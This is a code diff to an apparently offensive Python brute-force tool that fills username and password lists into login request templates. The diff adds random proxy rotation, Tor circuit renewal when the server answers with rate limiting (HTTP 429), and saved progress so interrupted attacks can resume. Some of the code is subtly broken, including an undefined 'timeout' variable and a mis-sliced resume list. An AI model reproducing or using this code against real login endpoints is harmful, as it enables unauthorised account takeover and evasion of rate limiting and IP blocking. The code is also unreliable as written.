@@ -1,8 +1,10 @@
 from requests import Session, Request
 from stem.control import Controller
 from lib.core.loggin import log
+from lib.core.managers.DataManager import SaveDataBase
 from http.client import responses
 import sys
+import random
 
 
 def check_response(my_response: object | str, response: object):
@@ -61,9 +63,22 @@ class Tor:
             self.controller.close()
             log.debug("The ControlPort Connection was closed", extra={"bold": True})
 
-class Requester:
+
+class Proxy:
+    def _format(line: str) -> object:
+        splitted_line = line.split(" ")
+        proxy = splitted_line[0]
+        protocol = splitted_line[1] if len(splitted_line) > 1 else 'http'
+        return {
+            'http': f'{protocol}://{proxy}',
+            'https': f'{protocol}://{proxy}'
+        }
+    
+
+
+class Requester(Proxy):
     methods = ['GET', 'OPTIONS', 'POST', 'PUT', 'DELETE']
-    def __init__(self, url: str, method: str = "POST", headers: object = {}, data: str = None):
+    def __init__(self, url: str, method: str = "POST", headers: object = {}, data: str = None, proxies: list = None):
         self.url = url
         self.method = method
         self.headers = headers
@@ -83,6 +98,9 @@ class Requester:
     
     def update_tor(self, tor: Tor) -> None:
         return tor.renew_circuit()
+
+    def random_proxy(self):
+        self.update_proxy()
     
 
     def use_tor(self, protocol: str = "http", port: str | int = 8080) -> None:
@@ -94,14 +112,30 @@ class Requester:
         self.update_proxy(tor)
 
 class Data_Attack(Requester):
-    def __init__(self, url: str, data: str, headers: object = {}, method: str = None, timeout: int = 0, response: list = None):
+    def __init__(self, 
+                 url: str, 
+                 data: str, 
+                 headers: object = {}, 
+                 method: str = None, 
+                 timeout: int = 0, 
+                 response: list = None, 
+                 proxies: list = None, 
+                 tor: tuple = (), 
+                 proxy: str = None,
+                 resume: bool = True
+                ):
         self.url = url
         self.method = method
         self.data = data
         self.headers = headers
+        self.proxies = proxies
+        self.tor = None
+
         
         self.attempts = 0
         self.timeout = timeout
+        self.save = SaveDataBase(url)
+        self.resume = resume
 
         self.s = None
         self.f = None
@@ -109,15 +143,35 @@ class Data_Attack(Requester):
         setattr(self, response[0].lower().replace("'", ""), response[1].replace("'", ""))
         
         super().__init__(url=self.url, method=self.method, headers=self.headers, data=self.data)
+        if proxy:
+            self.update_proxy(proxy)
+        if tor:
+            self.tor = Tor(control_port=tor[2])
+            self.tor.connect(tor[3])
+            self.use_tor(protocol=tor[0], port=tor[1])
+    
+    def save_progress(self, thread: int, param: str, current_list: list) -> None:
+        index = current_list.index(param)
+        self.save.update(thread, index)
+    
+    def get_save(self, thread):
+        data = self.save.read()
+        if data and self.resume:
+            return int(self.save.read()[thread])
 
     def __send(self, data: str | int, id: int = 0, type: tuple = None) -> None:
+        if self.proxies:
+            self.session = Session()
+            self.update_proxy(self._format(random.choice(self.proxies)))
         try:
             res = self.send(data=data)
             if res.status_code == 429:
                 timeout+=1
-                self.__send(id)
+                if self.tor:
+                    self.update_tor()
+                return self.__send(data=data, id=id, type=type)
             sf = check_response(my_response=self.s or self.f, response=res)
-            sys.stdout.write(f'\033[2K\r{self.attempts} of {self.total} => {int(self.attempts // self.total)}% [\033[38;2;255;0;111m#{id}\033[0m \033[35m{type[1]}\033[0m|\033[35m{type[2]}\033[0m => \033[38;5;214m{res.status_code}\033[0m]\r')
+            sys.stdout.write(f'\033[2K\r{self.attempts} of {self.total} => {(self.attempts * 100 / self.total):.2f}% [\033[38;2;255;0;111m#{id}\033[0m \033[35m{type[1]}\033[0m|\033[35m{type[2]}\033[0m => \033[38;5;214m{res.status_code}\033[0m]\r')
             sys.stdout.flush()
             if (self.s and sf) or (self.f and not sf):
                 sys.stdout.write(f'\033[2K\n[\033[0;32m+\033[0m] {type[0].capitalize()} found: {type[1]} ({self.attempts}) [#{id} {res.status_code}]\n')
@@ -125,12 +179,12 @@ class Data_Attack(Requester):
                 return True
             self.attempts+=1
         except Exception as e:
-            sys.stdout.write(f"\033[2K\n[\033[0;36mRE-ATTEMPT\033[0m] (\033[0;31m{e.__class__.__name__}\033[0m => \033[0;95m{e.__cause__}\033[0m) {str(e)}\n")
-            sys.stdout.flush()
-            self.__send(id)
+            print(f"[\033[0;36mRE-ATTEMPT\033[0m] (\033[0;31m{e.__class__.__name__}\033[0m => \033[0;95m{e.__cause__}\033[0m) {str(e)}\n => {data}")
+            self.__send(data=data, id=id, type=type)
 
     def bruteforce_username(self, usernames: list, password: str, id: int = 0) -> None:
-        for username in usernames[id]:
+        list_ = usernames[id] if self.save.read() == None else usernames[id][self.get_save(id)]
+        for username in list_:
             result = self.__send(data=self.data
                                  .replace("^USER^", username)
                                  .replace("^PASS^", password),
@@ -141,7 +195,8 @@ class Data_Attack(Requester):
                 break
 
     def bruteforce_password(self, username: str, passwords: list, id: int = 0):
-        for password in passwords[id]:
+        list_ = passwords[id] if self.save.read() == None else passwords[id][self.get_save(id)]
+        for password in list_:
             result = self.__send(data=self.data
                                  .replace("^USER^", username)
                                  .replace("^PASS^", password),
